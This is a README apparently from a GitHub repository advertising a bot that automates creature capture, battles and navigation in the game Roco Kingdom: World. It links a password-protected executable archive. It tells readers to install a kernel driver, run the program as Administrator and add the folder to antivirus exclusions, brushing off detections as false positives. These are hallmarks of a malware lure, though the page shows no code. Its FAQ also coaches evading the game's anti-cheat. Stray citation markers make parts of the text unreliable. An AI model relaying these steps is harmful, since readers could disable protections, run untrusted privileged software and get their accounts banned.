<div align="center">
<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/60890c7f-d869-46eb-8893-0bd63ebde4cf" />

# 🎯 Roco Kingdom World Auto Capture 2026

**Auto ball throw, creature detection, battle automation and route replay — for the Chinese MMORPG hit.**

[![Version](https://img.shields.io/badge/version-1.0.0-2563eb?style=for-the-badge)](https://github.com/CentaurQuailAtrium/roco-kingdom-world-auto-capture/releases)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078d4?style=for-the-badge&logo=windows)](https://github.com/CentaurQuailAtrium/roco-kingdom-world-auto-capture/releases)
[![License](https://img.shields.io/badge/license-MIT-16a34a?style=for-the-badge)](LICENSE)
[![Size](https://img.shields.io/badge/size-1.8%20MB-8b5cf6?style=for-the-badge)]()

</div>

---

## 📖 Overview

**Roco Kingdom World Auto Capture** is a free, native Windows tool for **《洛克王国：世界》** (Roco Kingdom: World) that automates creature capture, battle, and navigation using computer vision and kernel-level input simulation.

Roco Kingdom: World launched in March 2026 and quickly became one of the most-played MMORPGs in China, with **over 30 million users** in the first nine days. The game has a massive audience of players who want to streamline the grind of collecting creatures ("精灵").

### ⚠️ Important Disclaimer

This tool is provided for **educational and research purposes only**. Using automation tools may violate the game's Terms of Service. The authors are not responsible for any account bans or data loss.

---

## ✨ Features

<table>
<tr>
<td width="50%">

### 🎯 Auto Capture
- Real-time creature detection (YOLO)
- Auto ball throw with aim assist
- Shiny/rare creature detection
- Auto battle for contaminated creatures
- Capture target auto-stop

</td>
<td width="50%">

### 🗺️ Navigation & Routes
- Route recording and replay
- Teleport anchor positioning
- Auto-navigation between points
- Map-based waypoint system
- Failed step recovery

</td>
</tr>
<tr>
<td width="50%">

### ⚔️ Battle Automation
- Auto skill release
- Custom skill sequences
- Auto-battle for encounters
- Auto-retreat on low HP
- Battle scene detection

</td>
<td width="50%">

### 🔧 Technical Foundation
- Interception kernel driver
- Computer vision (YOLO/OpenCV)
- Screen capture (Windows Graphics Capture)
- Auto-pause on window unfocus
- OSD status overlay

</td>
</tr>
</table>

---

## 📥 Download

<div align="center">

### Latest Release — v1.0.0

[**⬇️ Download RocoAutoCapture.zip**](https://github.com/CentaurQuailAtrium/roco-kingdom-world-auto-capture/releases/latest)

**Archive size:** 1.8 MB · **Archive password:** `6427910552`

</div>

### Installation

1. Download the archive from the link above
2. Extract with WinRAR or 7-Zip
3. Enter the password: `6427910552`
4. Install the **Interception driver** (required for input simulation)
5. Run `RocoAutoCapture.exe` as Administrator
6. Launch Roco Kingdom: World and enable desired modules

---

## 🖼️ Screenshots

<div align="center">

| Main Menu | Auto Capture | Route Replay |
|:---:|:---:|:---:|
| ![Menu](docs/screenshots/menu.png) | ![Capture](docs/screenshots/capture.png) | ![Routes](docs/screenshots/routes.png) |

</div>

---

## 🛡️ Antivirus Notice

Some antivirus engines may flag this tool as **potentially unwanted** because it installs a kernel driver and simulates input. This is a **known false positive** for automation tools that use Interception.

**If this happens:**
- Add the extraction folder to your antivirus exclusions
- The Interception driver is a well-known open-source project used by many legitimate applications
- Audit the source code — everything is public

---

## 📊 What It Does

| Category | Details |
|:---|:---|
| **Capture** | Creature detection, auto ball throw, shiny detection, auto battle |
| **Navigation** | Route recording, replay, teleport anchors, waypoints |
| **Battle** | Auto skill release, custom sequences, encounter handling |
| **Input** | Interception kernel driver, no memory modification |

---

## ❓ FAQ

<details>
<summary><b>Is this safe? Will I get banned?</b></summary>

Roco Kingdom: World has active anti-cheat monitoring. The game's official security team regularly bans accounts using scripts or third-party tools [citation:2][citation:8].

This tool uses **Interception driver** (kernel-level input simulation) instead of memory modification, which is harder to detect. However, **no automation tool is 100% safe**. Use at your own risk.

**Recommended precautions:**
- Do not use on your main account
- Avoid obvious patterns (24/7 running, unrealistic playtimes)
- Use responsibly and at your own risk
</details>

<details>
<summary><b>Why is the archive so small?</b></summary>

Native C++ build. No Electron, no .NET runtime, no bundled installers. A 1.8 MB executable that does its job without bloat.
</details>

<details>
<summary><b>Do I need to install a driver?</b></summary>

Yes. The tool requires the **Interception driver** for kernel-level input simulation. This is a well-known open-source driver used by many automation tools. Installation takes one command and a reboot.
</details>

<details>
<summary><b>Does it work on Windows 11 24H2?</b></summary>

Yes. Full support for Windows 10 (1903+) and Windows 11 (21H2 — 24H2).
</details>

<details>
<summary><b>Does it work with the PC client?</b></summary>

Yes. Designed for the PC client (WeGame / official client).
</details>

---

## 🛠️ System Requirements

| Component | Minimum |
|:---|:---|
| **OS** | Windows 10 (1903+) or Windows 11 (21H2+) |
| **Architecture** | x64 |
| **RAM** | 4 GB |
| **Storage** | 10 MB free space |
| **GPU** | NVIDIA (recommended for YOLO) |
| **Runtime** | Interception driver (bundled installer) |
| **Permissions** | Administrator |

---

## 🗺️ Roadmap

- [x] Auto capture
- [x] Battle automation
- [x] Route replay
- [x] Interception driver support
- [ ] Multi-account support (v1.1.0)
- [ ] Advanced shiny hunting (v1.2.0)
- [ ] Auto egg hatching (v1.3.0)

---

## 🤝 Contributing

Contributions are welcome. Please open an issue first to discuss what you'd like to change.

1. Fork the repo
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes
4. Push and open a Pull Request

---

## 📜 License

Released under the **MIT License**. See [LICENSE](LICENSE) for details.

---

## 💙 Support

If Roco Kingdom World Auto Capture helped you — leave a ⭐ on GitHub and share it with your friends.

---

<div align="center">

**Keywords:** roco kingdom world auto capture · roco kingdom auto ball · roco kingdom script · roco kingdom automation · roco kingdom tool · chinese mmorpg helper · auto capture tool · 洛克王国 自动捕捉

</div>

---

*Last updated: October 2026*
